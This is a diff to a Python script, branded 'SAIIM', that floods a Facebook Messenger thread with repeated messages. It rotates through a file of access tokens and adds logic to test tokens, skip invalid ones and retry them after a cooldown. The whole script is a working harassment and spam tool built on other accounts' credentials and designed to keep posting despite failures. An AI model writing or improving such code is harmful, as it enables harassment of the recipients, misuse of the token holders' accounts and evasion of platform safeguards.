@@ -13,6 +13,7 @@ CYAN = '\033[96m'
 RESET = '\033[0m'
 
 CONFIG_FILE = "config.json"
+INVALID_TOKENS = {}
 
 BANNER = f"""{RED}
    _____ _____ _____ _____ 
@@ -21,8 +22,8 @@ BANNER = f"""{RED}
   \___ \  | | | |  | || |  
   ____) |_| |_| |__| || |_ 
  |_____/|_____|_____/_____|
-
-       --- S A I I M ---{RESET}
+       --- S A I I M ---
+{RESET}
 """
 
 def print_banner():
@@ -41,16 +42,13 @@ def get_profile_name(token):
     try:
         r = requests.get(url, params={"access_token": token}, timeout=10)
         data = r.json()
-        return data.get("name", "Unknown")
+        return data.get("name", "Unknown") if "error" not in data else None
     except:
-        return "Unknown"
+        return None
 
 def send_message(thread_id, message, token):
     url = f"https://graph.facebook.com/v15.0/t_{thread_id}"
-    payload = {
-        "access_token": token,
-        "message": message
-    }
+    payload = {"access_token": token, "message": message}
     try:
         r = requests.post(url, data=payload, timeout=10)
         if r.ok:
@@ -68,6 +66,22 @@ def load_lines(path):
     with open(path, "r", encoding="utf-8") as f:
         return [line.strip() for line in f if line.strip()]
 
+def filter_valid_tokens(tokens):
+    valid = []
+    for token in tokens:
+        if token in INVALID_TOKENS:
+            if time.time() - INVALID_TOKENS[token] < 300:  # wait 5 mins before retry
+                continue
+            else:
+                del INVALID_TOKENS[token]
+        name = get_profile_name(token)
+        if name:
+            valid.append(token)
+        else:
+            INVALID_TOKENS[token] = time.time()
+            print(f"{RED}[!] Skipping invalid token.{RESET}")
+    return valid
+
 def main():
     print_banner()
     config = load_config()
@@ -78,48 +92,46 @@ def main():
     message_file = config["message_file"]
     delay = int(config["delay"])
 
-    emojis = [" 3:)", " :)", " :3", " ^_^", " :D", " ;)", " :P", " \u2764", " \u2639"]
-
-    tokens = load_lines(token_file)
     messages = load_lines(message_file)
-    sent_tokens = set(tokens)
+    emojis = [" 3:)", " :)", " :3", " ^_^", " :D", " ;)", " :P", " ❤", " ☹"]
+
     msg_index = 0
+    token_index = 0
 
     print(f"{YELLOW}--- Live Logs (press Ctrl+C to stop) ---{RESET}")
-    last_token_reload = time.time()
 
-    while True:
-        try:
-            if time.time() - last_token_reload > 300:
-                current_tokens = load_lines(token_file)
-                for t in current_tokens:
-                    if t not in sent_tokens:
-                        print(f"{YELLOW}[+] New token added dynamically.{RESET}")
-                        sent_tokens.add(t)
-                tokens = list(sent_tokens)
-                last_token_reload = time.time()
-
-            for i, token in enumerate(tokens):
-                msg = f"{prefix} {messages[msg_index % len(messages)]} {random.choice(emojis)}"
-                print(f"{CYAN}THIS TOOL MADE BY SAIIM{RESET}")
-                success, err = send_message(thread_id, msg, token)
-                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                if success:
-                    name = get_profile_name(token)
-                    print(f"{GREEN}[{now}] Message sent from '{name}': {msg}{RESET}")
-                else:
-                    print(f"{RED}[{now}] Failed (Token {i+1}): {err}{RESET}")
-                    time.sleep(10)
-                msg_index += 1
-                time.sleep(delay)
-
-        except Exception as e:
-            print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
-            time.sleep(30)
-
-if __name__ == "__main__":
     try:
-        main()
+        while True:
+            tokens = load_lines(token_file)
+            valid_tokens = filter_valid_tokens(tokens)
+
+            if not valid_tokens:
+                print(f"{RED}[!] No valid tokens right now. Retrying in 60 seconds...{RESET}")
+                time.sleep(60)
+                continue
+
+            token = valid_tokens[token_index % len(valid_tokens)]
+            msg = f"{prefix} {messages[msg_index % len(messages)]} {random.choice(emojis)}"
+
+            success, err = send_message(thread_id, msg, token)
+            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            if success:
+                name = get_profile_name(token)
+                print(f"{GREEN}[{now}] Message sent from '{name or 'Unknown'}': {msg}{RESET}")
+                msg_index += 1
+            else:
+                print(f"{RED}[{now}] Failed (Token {token_index+1}): {err}{RESET}")
+                INVALID_TOKENS[token] = time.time()
+
+            token_index += 1
+            time.sleep(delay)
     except KeyboardInterrupt:
         print(f"\n{YELLOW}Stopped by user.{RESET}")
         sys.exit()
+    except Exception as e:
+        print(f"{RED}[FATAL ERROR] {e}{RESET}")
+        time.sleep(5)
+
+if __name__ == "__main__":
+    main()
